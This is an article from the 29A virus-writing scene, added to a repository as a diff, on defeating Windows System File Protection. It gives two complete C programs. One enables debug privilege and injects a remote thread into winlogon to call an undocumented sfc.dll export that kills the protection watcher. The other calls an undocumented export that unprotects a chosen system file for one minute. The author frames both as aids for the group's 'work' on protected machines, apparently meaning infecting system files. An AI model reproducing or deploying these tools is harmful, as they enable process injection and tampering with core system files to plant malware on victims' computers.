@@ -1,0 +1,208 @@
+
+                             .SFP revisited.
+                             .by Ratter/29A.
+
+.Intro.
+SFP again?you probably say reading the title of this article. Well
+because i found two nice ways to get rid of this i will bother you
+once more with it :-)
+
+
+.Method #1 - The compatible one.
+This is the very compatible method i found reversing some Microsoft
+utitities. It is used by them to let them modify the protected files.
+So here is how it works:
+
+It uses an undocumented export from sfc.dll #2 which name is
+SfcTerminateWatcherThread. It does exactly what it says :-) It
+terminates the Watcher Thread ie the thread that handles the
+directory change notifications. So we will call this function in the
+context of winlogon thus disabling the SFP on the box. I wrote an
+article about infecting winlogon so just to remember: first you need
+to adjust privileges, enable SeDebugPrivilege. This can be 
+done only from administrator account or under an account that has
+SeDebugPrivilege assigned to it. The rest is just invoking function
+in remote thread, read the code.
+
+This method works on Win2k, WinXP and i bet it will work on W2k3 but
+currently don't have access to this so haven't tested. If you do, pls 
+test it and let me know.
+
+Btw you maybe ask, how it is possible that this works on XP boxes
+also when sfc.dll no longer handles the SFP? Well #2 export from
+sfc.dll is redirected to sfc_os.dll :-)
+
+---- beginning of sfc_disable.c ----
+#include <windows.h>
+#include <assert.h>
+#include <stdio.h>
+
+#pragma check_stack (off)
+
+DWORD thread_func (FARPROC sfc_terminate)
+{
+   sfc_terminate();
+   return 0;
+}
+
+void after_thread_func(void)
+{
+}
+#pragma check_stack 
+
+int adjust_privileges(void)
+{
+  HANDLE token_handle;
+  int ret=0;
+
+  if(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token_handle))
+  {
+    LUID luid;
+    if(LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luid))
+    {
+      TOKEN_PRIVILEGES tk_priv;
+
+      tk_priv.PrivilegeCount=1;
+      tk_priv.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
+      tk_priv.Privileges[0].Luid=luid;
+
+      if(AdjustTokenPrivileges(token_handle,
+                               FALSE,
+                               &tk_priv,
+                               0,
+                               NULL,
+                               NULL)) ret=1;
+    }
+    CloseHandle(token_handle);
+  }
+  return ret;
+}
+
+void main(int argc, char **argv)
+{
+  HANDLE remote_thread;
+
+  if(argc!=2)
+  {
+    printf("Usage: sfc_disable <winlogon_pid>\n");
+    exit(0);
+  }
+
+  DWORD wpid=atoi(argv[1]);
+  assert(wpid);
+
+  HMODULE sfc=LoadLibrary("sfc.dll");
+  assert(sfc);
+
+  FARPROC sfc_terminate=GetProcAddress(sfc, (char *) 2);
+  assert(sfc_terminate);
+
+  assert(adjust_privileges());
+
+  HANDLE process=OpenProcess(PROCESS_ALL_ACCESS, FALSE, wpid);
+  if(!process)
+  {
+    printf("Error while opening process\n");
+    exit(0);
+  }
+
+  LPVOID remote_mem=VirtualAllocEx(process,
+                                   NULL,
+                                   (SIZE_T) ((char *)after_thread_func-(char *)thread_func),
+                                   MEM_COMMIT,
+                                   PAGE_READWRITE);
+  if(!remote_mem)
+  {
+    printf("Error while commiting memory in the remote process\n");
+    goto clean_up;
+  }
+
+  if(!WriteProcessMemory(process,
+                         remote_mem,
+                         (char *) thread_func,
+                         (SIZE_T) ((char *)after_thread_func-(char *)thread_func),
+                         (SIZE_T *) 0))
+  {
+    printf("Error %d while writing to the remote process\n", GetLastError());
+    goto clean_up;
+  }
+
+  remote_thread=CreateRemoteThread(process,
+                                   NULL,
+                                   0,
+                                   (LPTHREAD_START_ROUTINE) remote_mem,
+                                   // (LPTHREAD_START_ROUTINE) sfc_terminate
+                                   (LPVOID) sfc_terminate,
+                                   0,
+                                   NULL);
+  if(!remote_thread)
+  {
+    printf("Error while creating remote thread in the process\n");
+    goto clean_up;
+  }
+                                          
+  if(WaitForSingleObject(remote_thread, 10*1000)==WAIT_TIMEOUT)
+    printf("Timeout occured while waiting for the remote thread\n");
+
+  CloseHandle(remote_thread);
+
+clean_up:
+  if(remote_mem) VirtualFreeEx(process, remote_mem, 0, MEM_RELEASE);
+  CloseHandle(process);
+}
+---- end of sfc_disable.c ----
+
+
+.Method #2 - The nice one.
+This method is the nicest one from all i'm currently aware of. It is
+XP only (maybe W2k3??) and it's more or less some kind of a backdoor
+of Microsoft :-) Where's the point?
+
+When i was looking for changes in WinXP implementation of the system
+file protection first i of course found, that SFP is now not in
+sfc.dll but rather in sfc_os.dll so i fired up IDA and started to
+look around the code. It didn't took so much time when i found it. In 
+XP's implementation of SFP there exists a facility to disable SFP on
+file basis for one minute. Don't you trust me? Then test it :-)
+
+---- beginning of sfp_exc.c ----
+#include <windows.h>
+#include <assert.h>
+#include <stdio.h>
+
+typedef DWORD (* SFPEXC)(DWORD, wchar_t *, DWORD);
+
+void wmain(int argc, wchar_t **argv)
+{
+  HMODULE sfc_os;
+  SFPEXC sfp_exc;
+
+  assert(argc==2);
+  assert(sfc_os=LoadLibrary("sfc_os.dll"));
+  assert(sfp_exc=(SFPEXC) GetProcAddress(sfc_os, (char *) 5));
+
+  assert(!sfp_exc(0, argv[1], -1));
+  wprintf(L"File %s should now be unprotected for 1 minute", argv[1]);
+}
+---- end of sfp_exc.c ----
+
+For this method you have to use administrator account since the code
+explicitly checks for it. It uses an undocumented export #5 named
+SfcFileException that again does what the name says :-) It first
+looks whether the file is protected and if it is, it assigns a flag
+to it. Now when the watcher thread is invoked because of
+replacement/modification/deletion of the protected file it first
+checks, whether the file should be exceptioned. If it should, then it 
+tests whether the exemption fits into one minute interval. If it does 
+than voila it does nothing but goes on :-)
+
+
+.Closing.
+Hopefully these two little progs i showed you in this article will
+make our work on SFP protected boxes more pleasant than it currently
+is. And of course - if you have any ideas/suggestions, write me.
+
+btw - watch the file size ;-)
+
+--
+Ratter/29A - I'm a stranger in the world I haven't made.
